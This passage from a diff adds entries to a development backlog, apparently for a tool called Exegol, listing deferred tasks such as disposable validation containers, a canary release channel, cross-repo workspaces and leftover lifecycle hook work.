+  (no bytes to hidden panes) already shipped, and the pool pays off only above ~5 live tabs.
+- **T154 Ephemeral validation containers** (`added: 2026-07-09`): disposable Apple `container` VMs
+  for tests and evaluator gates (not agent isolation); waits for pipelines in daily use.
+- **T46 Canary channel** (`added: 2026-04-15`): only worth it if a second release channel is planned.
+- **T92 Cross-repo workspaces** (`added: 2026-04-15`): one tab bound to N repos; T146 project
+  groups is the cheap precursor that shipped.
+- **T60 Project hook scripts, remaining delta** (`added: 2026-04-01`): mostly superseded by T91
+  (`.exegol/lifecycle.yaml`); left: an `archive` hook on worktree archival and env vars
+  (`EXEGOL_ROOT_PATH`, `EXEGOL_WORKTREE_PATH`, `EXEGOL_BRANCH`, `EXEGOL_AGENT_ID`) in
+  `lifecycle/loader.ts`. One S change when a hook needs them.
